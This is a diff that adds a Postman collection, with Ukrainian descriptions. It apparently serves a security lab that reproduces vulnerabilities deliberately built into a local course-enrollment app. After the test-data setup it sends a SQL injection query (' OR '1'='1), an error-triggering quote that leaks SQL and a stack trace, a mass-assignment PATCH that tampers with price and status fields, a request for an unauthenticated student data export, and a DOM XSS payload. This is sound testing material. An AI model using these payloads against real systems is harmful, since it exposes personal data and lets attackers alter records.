@@ -1,0 +1,247 @@
+{
+  "info": {
+    "name": "Security Testing (Course Enrollment System)",
+    "description": "Набір запитів для підготовки тестових даних та відтворення інтегрованих вразливостей (SQLi, Mass Assignment, Info Leak, Sensitive Data Disclosure, XSS).",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+  },
+  "variable": [
+    { "key": "baseUrl", "value": "http://localhost:8080", "type": "string" },
+    { "key": "studentId", "value": "1", "type": "string" },
+    { "key": "student2Id", "value": "2", "type": "string" },
+    { "key": "courseId", "value": "1", "type": "string" },
+    { "key": "enrollmentId", "value": "1", "type": "string" }
+  ],
+  "item": [
+    {
+      "name": "0. Setup (Test Data)",
+      "item": [
+        {
+          "name": "Create Student 1",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "const data = pm.response.json();",
+                  "if (data.id) pm.collectionVariables.set('studentId', data.id);"
+                ],
+                "type": "text/javascript"
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [{ "key": "Content-Type", "value": "application/json" }],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"code\": \"SEC-STU-1\",\n  \"age\": 22,\n  \"entryScore\": 90,\n  \"regular\": false\n}"
+            },
+            "url": {
+              "raw": "{{baseUrl}}/students",
+              "host": ["{{baseUrl}}"],
+              "path": ["students"]
+            }
+          }
+        },
+        {
+          "name": "Create Student 2",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "const data = pm.response.json();",
+                  "if (data.id) pm.collectionVariables.set('student2Id', data.id);"
+                ],
+                "type": "text/javascript"
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [{ "key": "Content-Type", "value": "application/json" }],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"code\": \"SEC-STU-2\",\n  \"age\": 23,\n  \"entryScore\": 85,\n  \"regular\": true\n}"
+            },
+            "url": {
+              "raw": "{{baseUrl}}/students",
+              "host": ["{{baseUrl}}"],
+              "path": ["students"]
+            }
+          }
+        },
+        {
+          "name": "Create Course",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "const data = pm.response.json();",
+                  "if (data.id) pm.collectionVariables.set('courseId', data.id);"
+                ],
+                "type": "text/javascript"
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [{ "key": "Content-Type", "value": "application/json" }],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"code\": \"SEC-CRS-1\",\n  \"price\": 100000,\n  \"capacity\": 10,\n  \"level\": 1\n}"
+            },
+            "url": {
+              "raw": "{{baseUrl}}/courses",
+              "host": ["{{baseUrl}}"],
+              "path": ["courses"]
+            }
+          }
+        },
+        {
+          "name": "Create Enrollment 1",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "const data = pm.response.json();",
+                  "if (data.id) pm.collectionVariables.set('enrollmentId', data.id);"
+                ],
+                "type": "text/javascript"
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [{ "key": "Content-Type", "value": "application/json" }],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"reference\": \"SEC-REF-1\",\n  \"studentId\": {{studentId}},\n  \"courseId\": {{courseId}},\n  \"couponValid\": false\n}"
+            },
+            "url": {
+              "raw": "{{baseUrl}}/enrollments",
+              "host": ["{{baseUrl}}"],
+              "path": ["enrollments"]
+            }
+          }
+        },
+        {
+          "name": "Create Enrollment 2",
+          "request": {
+            "method": "POST",
+            "header": [{ "key": "Content-Type", "value": "application/json" }],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"reference\": \"SEC-REF-2\",\n  \"studentId\": {{student2Id}},\n  \"courseId\": {{courseId}},\n  \"couponValid\": false\n}"
+            },
+            "url": {
+              "raw": "{{baseUrl}}/enrollments",
+              "host": ["{{baseUrl}}"],
+              "path": ["enrollments"]
+            }
+          }
+        }
+      ]
+    },
+    {
+      "name": "1. SQL Injection (Search)",
+      "request": {
+        "method": "GET",
+        "url": {
+          "raw": "{{baseUrl}}/enrollments/search?reference=' OR '1'='1",
+          "host": ["{{baseUrl}}"],
+          "path": ["enrollments", "search"],
+          "query": [
+            { "key": "reference", "value": "' OR '1'='1" }
+          ]
+        },
+        "description": "Повертає всі записи з таблиці enrollments замість точного збігу."
+      }
+    },
+    {
+      "name": "2a. Mass Assignment (PATCH protected fields)",
+      "request": {
+        "method": "PATCH",
+        "header": [{ "key": "Content-Type", "value": "application/json" }],
+        "body": {
+          "mode": "raw",
+          "raw": "{\n  \"reference\": \"SEC-REF-1-TAMPERED\",\n  \"total\": 1,\n  \"prepaid\": 1,\n  \"status\": \"COMPLETED\"\n}"
+        },
+        "url": {
+          "raw": "{{baseUrl}}/enrollments/{{enrollmentId}}",
+          "host": ["{{baseUrl}}"],
+          "path": ["enrollments", "{{enrollmentId}}"]
+        },
+        "description": "Підміна захищених полів total, prepaid, status через PATCH."
+      }
+    },
+    {
+      "name": "2b. Verify Tampered Fields in DB (GET)",
+      "request": {
+        "method": "GET",
+        "url": {
+          "raw": "{{baseUrl}}/enrollments/{{enrollmentId}}",
+          "host": ["{{baseUrl}}"],
+          "path": ["enrollments", "{{enrollmentId}}"]
+        },
+        "description": "Підтверджує, що підмінені total, prepaid та status збереглися у БД."
+      }
+    },
+    {
+      "name": "3. Information Disclosure (SQL & Stack Trace)",
+      "request": {
+        "method": "GET",
+        "url": {
+          "raw": "{{baseUrl}}/enrollments/search?reference='",
+          "host": ["{{baseUrl}}"],
+          "path": ["enrollments", "search"],
+          "query": [
+            { "key": "reference", "value": "'" }
+          ]
+        },
+        "description": "Викликає синтаксичну помилку SQL і повертає HTTP 500 із текстом SQL-запиту та повним Java stack trace."
+      }
+    },
+    {
+      "name": "4a. Sensitive Data Disclosure (robots.txt)",
+      "request": {
+        "method": "GET",
+        "url": {
+          "raw": "{{baseUrl}}/robots.txt",
+          "host": ["{{baseUrl}}"],
+          "path": ["robots.txt"]
+        },
+        "description": "Розкриває шлях до /assets/student-export.json."
+      }
+    },
+    {
+      "name": "4b. Sensitive Data Disclosure (student-export.json)",
+      "request": {
+        "method": "GET",
+        "url": {
+          "raw": "{{baseUrl}}/assets/student-export.json",
+          "host": ["{{baseUrl}}"],
+          "path": ["assets", "student-export.json"]
+        },
+        "description": "Повертає внутрішні дані слухачів (email, privateNote) без автентифікації."
+      }
+    },
+    {
+      "name": "5. DOM XSS URL (Open in Browser)",
+      "request": {
+        "method": "GET",
+        "url": {
+          "raw": "{{baseUrl}}/index.html?welcome=<img src=x onerror=alert(1)>",
+          "host": ["{{baseUrl}}"],
+          "path": ["index.html"],
+          "query": [
+            { "key": "welcome", "value": "<img src=x onerror=alert(1)>" }
+          ]
+        },
+        "description": "XSS виконується у браузері через $('welcome').innerHTML в app.js."
+      }
+    }
+  ]
+}
